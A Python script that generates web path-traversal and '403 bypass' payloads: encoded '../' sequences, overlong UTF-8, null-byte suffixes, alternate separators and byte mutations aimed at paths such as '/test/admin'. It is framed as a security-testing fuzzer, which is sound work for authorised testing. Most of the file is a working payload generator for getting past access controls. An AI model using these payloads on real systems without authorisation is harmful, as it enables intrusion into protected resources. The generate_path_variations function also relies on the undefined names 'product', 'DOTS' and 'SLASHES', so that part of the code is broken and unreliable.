import re
import random
from typing import Callable, Generator, Set
import urllib.parse
import sys

# Path-specific grammar components
PATH_GRAMMAR = {
    'segment': [  # Remove regex syntax
        lambda: ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&\'()*+,;=:@', k=random.randint(1,4))),
        lambda: urllib.parse.quote(''.join(random.choices('<>[]{}|\\^`', k=2)))
    ],
    'traversal': [
        '../', '..\\', '%2e%2e/', '%252e%252e/',
        '%c0%ae%c0%ae/', '..%00', '..%01'
    ],
    'separator': [
        '/', '\\', '%2f', '%5c', '%252f', 
        '%c0%af', '%u2215', '//', '\\\\'
    ],
    'encoding': [
        lambda s: s,
        lambda s: urllib.parse.quote(s),
        lambda s: urllib.parse.quote(s, safe=''),
        lambda s: ''.join(f'%{ord(c):02x}' for c in s),
        lambda s: ''.join(f'%{ord(c):02X}' for c in s),
        lambda s: re.sub(r'%[0-9A-F]{2}', lambda m: m.group().lower(), urllib.parse.quote(s)),
    ]
}

MUTATORS = [
    lambda b: _byte_mutate(b, 'replace'),
    lambda b: _byte_mutate(b, 'insert'),
    lambda b: _byte_mutate(b, 'delete'),
]

def _byte_mutate(b: bytes, operation: str) -> bytes:
    """Core mutation engine for raw bytes"""
    if not b:
        return b
    
    idx = random.randint(0, len(b) - 1)
    if operation == 'replace':
        return b[:idx] + bytes([random.randint(0, 255)]) + b[idx+1:]
    elif operation == 'insert':
        return b[:idx] + bytes([random.randint(0, 255)]) + b[idx:]
    elif operation == 'delete':
        return b[:idx] + b[idx+1:] if len(b) > 1 else b
    return b

def _apply_grammar_rules(rules: list) -> Generator[Callable, None, None]:
    """Infinite generator of grammar-based patterns"""
    while True:
        rule = random.choice(rules)
        yield rule  # Yield the callable itself instead of executing it

def _generate_path_components() -> Generator[str, None, None]:
    """Generate valid but suspicious path components"""
    while True:
        # Execute the lambda to get actual strings
        component = random.choice([
            *[fn() for fn in PATH_GRAMMAR['segment']],  # Execute segment lambdas
            *PATH_GRAMMAR['traversal']                  # Raw traversal strings
        ])
        yield component
        
        # Generate mutated versions
        base = random.choice(['..', '...', '.%00.', '%2e%2e'])
        mutated = _byte_mutate(base.encode(), random.choice(['replace', 'insert', 'delete']))
        yield mutated.decode('latin-1', errors='ignore')

def generate_encoded_variants(payload: str, disable_utf8: bool = False) -> list[str]:
    """Generate multiple encoding variants of a payload string"""
    variants = []
    
    # URL encoding variations
    variants.append(urllib.parse.quote(payload))  # Standard encoding
    variants.append(urllib.parse.quote(payload, safe=''))  # Force-encode all characters
    variants.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
    
    # Case variation encoding
    mixed_case = re.sub(
        r'%[0-9a-fA-F]{2}', 
        lambda m: m.group().upper() if random.random() > 0.5 else m.group().lower(),
        urllib.parse.quote(payload)
    )
    variants.append(mixed_case)
    
    if not disable_utf8:
        # UTF-8 specific encodings
        variants.append(payload.replace('.', '%C0%AE').replace('/', '%C0%AF'))  # Overlong
        variants.append(payload.replace('/', '%u2215').replace('\\', '%u2216'))  # Unicode escapes
    
    # Hexadecimal variations
    variants.append(''.join(f'%{ord(c):02x}' for c in payload))  # Lower hex
    variants.append(''.join(f'%{ord(c):02X}' for c in payload))  # Upper hex
    
    return list(set(variants))  # Deduplicate

def generate_path_variations(
    base_path: str, 
    depth: int = 3, 
    disable_utf8: bool = False
) -> list[str]:
    """Generate path variations with encoding options"""
    base = base_path.rstrip('/')
    variations = []
    
    # Traversal patterns
    for dots, slashes in product(DOTS[:depth], SLASHES):
        variations.append(f"{base}{dots}{slashes}")
        variations.append(f"{base}{slashes}{dots}")
    
    # Encoding variants
    encoded = []
    for var in variations:
        encoded.extend(generate_encoded_variants(var, disable_utf8))
    
    # Add raw mutated versions
    mutated = [
        _byte_mutate(var.encode(), random.choice(['replace', 'insert', 'delete']))
        for var in variations
    ]
    variations.extend([m.decode('latin-1', errors='ignore') for m in mutated])
    
    return list(set(variations + encoded))

def generate_fuzzed_paths(
    base_path: str,
    max_payloads: int = 1000,
    disable_utf8: bool = False
) -> Set[str]:
    """Generate security test payloads for path parsing
     
    Args:
        base_path: Initial path to fuzz (e.g. "/api/v1")
        max_payloads: Maximum unique payloads to generate
        disable_utf8: Skip Unicode/UTF-8 variations for speed
    """
    seen = set()
    base = base_path.rstrip('/')
    
    component_gen = _generate_path_components()
    encoding_gen = _apply_grammar_rules(PATH_GRAMMAR['encoding'])
    
    while len(seen) < max_payloads:
        comp = next(component_gen)
        encode_fn = next(encoding_gen)
        
        # Properly apply encoding function to the component
        encoded_comp = encode_fn(comp)  # Now encode_fn is callable
        
        # Build variants
        variants = [
            f"{base}/{encoded_comp}",
            f"{base}{encoded_comp}",
            f"{encoded_comp}{base}",
            f"{base}/{encoded_comp}/..",
            f"{base}{encoded_comp}%00"
        ]
        
        # Add mutated versions
        for var in variants[:]:
            mutated = _byte_mutate(var.encode(), random.choice(['replace', 'insert', 'delete']))
            variants.append(mutated.decode('latin-1', errors='ignore'))
        
        # Register unique payloads
        for payload in variants:
            if payload not in seen:
                seen.add(payload)
                if len(seen) >= max_payloads:
                    return seen
                
    return seen

def generate_403_bypasses(base_path: str, max_payloads: int = 500) -> Set[str]:
    """Generate targeted 403 bypass payloads while preserving original path"""
    preserved_base = base_path.rstrip('/')
    bypass_patterns = [
        # Path traversal variants
        '/.//', '/\\', '//', '/%2f', '/%5c',
        '/..;/', '/..%00/', '/.%00/',
        
        # Encoding tricks
        '%25%32%66',  # Double-encoded slash
        '%252e%252e',  # Double-encoded ..
        '%c0%ae%c0%ae',  # UTF-8 overlong
        '..%01',  # Non-standard nulls
        
        # Case variation
        '/%2F', '/%2f',
        
        # Special combinations
        '/.', '/.../', '/..../'
    ]
    
    seen = set()
    
    # Generate smart permutations
    for pattern in bypass_patterns:
        if len(seen) >= max_payloads:
            break
            
        # Prepend/append patterns
        variants = [
            f"{preserved_base}{pattern}",  # /test/admin..
            f"{pattern}{preserved_base}",  # ..;/test/admin
            f"{preserved_base}{pattern}payload",  # /test/admin..;/payload
            f"{preserved_base}/.{pattern}/",  # /test/admin/./..;/
        ]
        
        # Add encoded versions
        variants += [urllib.parse.quote(v) for v in variants]
        
        # Add null-byte suffixes
        variants += [f"{v}%00" for v in variants]
        
        for payload in variants:
            if payload not in seen:
                seen.add(payload)
                
    return seen

# Example usage
if __name__ == "__main__":
    # Basic test
    #payloads = generate_fuzzed_paths("/test/admin", int(sys.argv[1]), disable_utf8=True)
    payloads = generate_403_bypasses("/test/admin", int(sys.argv[1]))
    print(f"Generated {len(payloads)} test cases")
    for p in list(payloads)[:int(sys.argv[2])]:
        print(p)
